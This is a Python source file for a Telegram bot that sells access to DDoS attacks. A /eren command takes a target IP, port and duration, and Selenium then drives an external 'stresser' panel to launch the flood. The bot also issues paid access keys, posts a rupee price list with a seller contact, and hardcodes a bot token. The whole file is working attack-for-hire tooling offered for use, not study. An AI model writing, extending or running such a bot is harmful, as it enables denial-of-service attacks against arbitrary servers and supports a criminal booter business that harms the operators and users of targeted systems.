# stresser_bot.py
import asyncio
import logging
import sqlite3
import time
from datetime import datetime, timedelta

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ==================== CONFIG ====================
TOKEN = "8793284729:AAHHZ3HDQuXa8zOhde9GuJ8swcrWJcm4UWA"
ADMIN_IDS = [123456789, 84342238157]
DB_FILE = "bot_data.db"
PANEL_URL = "https://return.st/panel"

DEFAULT_TIME = 60
MAX_TIME = 60
# ================================================

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Database Setup
def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, registered_at TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, days INTEGER, created_at TEXT, used_by INTEGER DEFAULT NULL, used_at TEXT)''')
        conn.commit()

init_db()

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def generate_key(days: int) -> str:
    key = f"eren-{int(time.time())}-{days}d"
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("INSERT INTO keys (key, days, created_at) VALUES (?, ?, ?)", (key, days, datetime.now().isoformat()))
        conn.commit()
    return key

def redeem_key(key: str, user_id: int) -> tuple[bool, str]:
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("SELECT days, used_by FROM keys WHERE key = ?", (key,))
        row = c.fetchone()
        if not row:
            return False, "❌ Invalid key."
        days, used_by = row
        if used_by is not None:
            return False, "❌ Key already used."
        c.execute("UPDATE keys SET used_by = ?, used_at = ? WHERE key = ?", (user_id, datetime.now().isoformat(), key))
        conn.commit()
    return True, f"✅ Key redeemed! Valid for {days} days."

# ==================== SELENIUM - Connect to Existing Chrome ====================
driver = None
wait = None

def init_browser():
    global driver, wait
    try:
        options = uc.ChromeOptions()
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-gpu")

        # Connect to already running Chrome
        driver = uc.Chrome(
            options=options,
            debugger_address="127.0.0.1:9222"
        )
        wait = WebDriverWait(driver, 20)

        if "return.st" not in driver.current_url:
            driver.get(PANEL_URL)
            time.sleep(8)

        logger.info("✅ Connected to Chrome on port 9222 successfully!")
    except Exception as e:
        logger.error(f"Browser connection failed: {e}")
        raise

async def send_attack(ip: str, port: str, seconds: int):
    global driver, wait
    if driver is None:
        init_browser()

    try:
        # IP
        ip_el = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input[placeholder*='70']")))
        ip_el.clear()
        ip_el.send_keys(ip)

        # Port (first number input)
        port_el = wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, "input[type='number']")))[0]
        port_el.clear()
        port_el.send_keys(port)

        # Time (second number input)
        if seconds > MAX_TIME:
            seconds = MAX_TIME
        time_el = wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, "input[type='number']")))[1]
        time_el.clear()
        time_el.send_keys(str(seconds))

        # Launch Button
        btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Launch') or contains(text(), 'Attack')]")))
        btn.click()

        return True, f"✅ **Attack Started**\nTarget: `{ip}:{port}`\nDuration: {seconds}s"

    except Exception as e:
        return False, f"❌ Error: {str(e)}"

# ==================== COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "👋 **Welcome!** Use `/eren <ip> <port> [time]` (Max 60s)"
    await update.message.reply_text(text, parse_mode="Markdown")

async def eren(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("❌ `/eren <ip> <port> [seconds]`", parse_mode="Markdown")
        return

    ip = context.args[0]
    port = context.args[1]
    seconds = int(context.args[2]) if len(context.args) > 2 else DEFAULT_TIME

    if seconds < 10 or seconds > MAX_TIME:
        await update.message.reply_text(f"❌ Time must be 10-{MAX_TIME}s", parse_mode="Markdown")
        return

    msg = await update.message.reply_text("🔄 **Preparing Attack...**", parse_mode="Markdown")
    success, result = await send_attack(ip, port, seconds)

    if success:
        await msg.edit_text(result, parse_mode="Markdown")
        await asyncio.sleep(seconds + 5)
        await update.message.reply_text(f"🏁 **Finished** `{ip}:{port}`", parse_mode="Markdown")
    else:
        await msg.edit_text(result, parse_mode="Markdown")

async def price(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💰 1 Day = 50₹\n7 Days = 300₹\nDM @LFX_EREN", parse_mode="Markdown")

async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_photo(open('1.jpg','rb'), caption="Singapore")
        await update.message.reply_photo(open('2.jpg','rb'), caption="Bangalore")
        await update.message.reply_photo(open('3.jpg','rb'), caption="Canada")
    except:
        await update.message.reply_text("Images not found.")

# Add more commands if needed...

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("eren", eren))
    app.add_handler(CommandHandler("price", price))
    app.add_handler(CommandHandler("panel", panel))

    print("🤖 Bot running with external Chrome...")
    app.run_polling()

if __name__ == "__main__":
    main()
